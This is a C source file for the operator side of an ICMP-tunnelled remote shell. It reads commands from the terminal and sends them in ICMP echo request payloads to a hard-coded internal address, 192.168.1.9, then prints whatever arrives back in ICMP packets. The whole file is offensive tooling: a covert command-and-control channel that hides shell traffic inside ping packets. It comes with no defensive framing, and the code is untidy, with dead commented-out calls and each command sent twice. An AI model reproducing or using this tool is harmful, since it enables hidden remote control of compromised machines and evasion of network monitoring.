

#include <stdio.h>

#include <stdlib.h>

#include <sys/types.h>

#include <sys/socket.h>

#include <sys/stat.h>

#include <netinet/in.h>

#include <netinet/ip_icmp.h>

#include <netinet/ip.h>

#include <string.h>

#include <unistd.h>

#include <arpa/inet.h>

#include <fcntl.h>

#include <sys/time.h>

#include "icmp_shell.h"

#include "buffer.h"



#define IN_BUF_SIZE   1024

#define OUT_BUF_SIZE  64



typedef unsigned int uint32;

typedef unsigned short uint16;

typedef unsigned char uint8;



uint16 random16(){

  struct timeval tv;

  gettimeofday(&tv, NULL);

  return (uint16)tv.tv_sec * tv.tv_usec;

}

// calculate checksum

pthread_mutex_t g_output_mutex;



pthread_t MyCreateThread(void * (*func)(void *), void *lparam)

{

    pthread_attr_t attr;

    pthread_t  p;

    pthread_attr_init(&attr);

    //pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);

    if (0 == pthread_create(&p, &attr, func, lparam))

    {

        pthread_attr_destroy(&attr);

        return p;

    }

    //dbg_msg("pthread_create() error: %s \n", strerror(errno));

    pthread_attr_destroy(&attr);

    return 0;

}



unsigned short checksum(unsigned short *ptr, int nbytes)

{

    unsigned long sum;

    unsigned short oddbyte, rs;



    sum = 0;

    while(nbytes > 1) {

        sum += *ptr++;

        nbytes -= 2;

    }



    if(nbytes == 1) {

        oddbyte = 0;

        *((unsigned char *) &oddbyte) = *(u_char *)ptr;

        sum += oddbyte;

    }



    sum  = (sum >> 16) + (sum & 0xffff);

    sum += (sum >> 16);

    rs = ~sum;

    return rs;

}



int icmp_sendrequest(int icmp_sock, uint32 ip, uint8 *pdata, uint32 size)

{

    struct icmphdr *icmp;

    struct sockaddr_in addr;

    int nbytes;

    int ret = 1;



    //dbg_msg("%s: try send request to %s \n", __func__, iptos(ip));



    icmp = (struct icmphdr *)malloc(sizeof(struct icmphdr) + size);

    if (NULL == icmp)

    {

        return -1;

    }

    icmp->type = 8;  // icmp  request

    icmp->code = 0;

    icmp->un.echo.id = random16();

    icmp->un.echo.sequence = random16();



    memcpy(icmp + 1, pdata, size);

    memset(&addr, 0, sizeof(struct sockaddr_in));

    addr.sin_family = AF_INET;

    addr.sin_addr.s_addr = ip;



    icmp->checksum = 0x00;

    icmp->checksum = checksum((unsigned short *) icmp, sizeof(struct icmphdr) + size);



    // send reply

    nbytes = sendto(icmp_sock, icmp, sizeof(struct icmphdr) + size, 0, (struct sockaddr *) &addr, sizeof(addr));

    if (nbytes == -1)

    {

        perror("sendto");

        ret = -1;

    }

    free(icmp);

    return ret;

}



void *Recv(void *lparam){

    int sockfd;

    int flags;

    char in_buf[IN_BUF_SIZE];

    char out_buf[OUT_BUF_SIZE];

    unsigned int out_size;

    int nbytes;

    struct iphdr *ip;

    struct icmphdr *icmp;

    char *data;

    struct sockaddr_in addr;





    //printf("icmpsh - master\n");

    

    // create raw ICMP socket

    sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);

    if (sockfd == -1) {

       perror("socket");

       

    }



    // set stdin to non-blocking

    flags = fcntl(0, F_GETFL, 0);

    flags |= O_NONBLOCK;

    fcntl(0, F_SETFL, flags);



    //printf("running...\n");

    printf("cmd #\n");

    //unsigned char command[] = "whoami";

    //icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), "hello", 5);

    //icmp_sendrequest(sockfd, inet_addr("192.168.1.67"), command, sizeof(command));

    while(1) {



        // read data from socket

        unsigned char command[] = "uname";



        memset(in_buf, 0x00, IN_BUF_SIZE);

        nbytes = read(sockfd, in_buf, IN_BUF_SIZE - 1);

        if (nbytes > 0) {

            // get ip and icmp header and data part

            ip = (struct iphdr *) in_buf;

            if (nbytes > sizeof(struct iphdr)) {

                nbytes -= sizeof(struct iphdr);

                icmp = (struct icmphdr *) (ip + 1);

                if (nbytes > sizeof(struct icmphdr)) {

                    nbytes -= sizeof(struct icmphdr);

                    data = (char *) (icmp + 1);

                    data[nbytes] = '\0';

                    //printf("%s", data);

                    fflush(stdout);

                }

                

                // reuse headers

                char buffer[50];

                sprintf(buffer, "%c%c%c%c%c", data[0], data[1], data[2],data[3],data[4]);

                int result;

                result = strcmp(buffer, "hello");

                printf("%s", data);

                //icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), "hello", 5);

                //icmp_sendrequest(sockfd, inet_addr("192.168.1.67"), command, sizeof(command));



            }

        } else{

            unsigned char command[] = "whoami";

            icmp_sendrequest(sockfd, inet_addr("192.168.1.9"), command, sizeof(command));

        }

    }

}



void *cmd_exec(){

    int sockfd;

    sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);

    if (sockfd == -1) {

       perror("socket");

       

    }

    



    while (1){

        int readx;

        //printf("cmd $ ");

        

        unsigned char command[2048];

        readx = read(0, command, 2048);

        if (readx > 0){

        //icmp_sendrequest(sockfd, inet_addr("192.168.1.9"), command, sizeof(command));

            icmp_sendrequest(sockfd, inet_addr("192.168.1.9"), command, sizeof(command));

            icmp_sendrequest(sockfd, inet_addr("192.168.1.9"), command, sizeof(command));

            //printf("cmd $ ");

        } else{

            continue;

        }

    }

    

}



int main(int argc, char **argv)

{

    int sockfd;



    sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);

    if (sockfd == -1) {

       perror("socket");

       return -1;

    }





    

    //close(read_pipe[1]);

    //close(write_pipe[0]);

    //icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), "hello", 5);

    //tell the icmp_recv thread exit ...

    //close(read_pipe[0]);

    //close(write_pipe[1])

    //printf("cmd $ ");

    pthread_t hIcmpRecv;

    pthread_t cmdconn;

    pthread_mutex_init(&g_output_mutex, NULL);

    hIcmpRecv = MyCreateThread(Recv, NULL);

    cmdconn = MyCreateThread(cmd_exec, NULL);

    pthread_join(hIcmpRecv, NULL);

    pthread_join(cmdconn, NULL);

    close(sockfd);

    //cmd_exec();







    return 0;

}



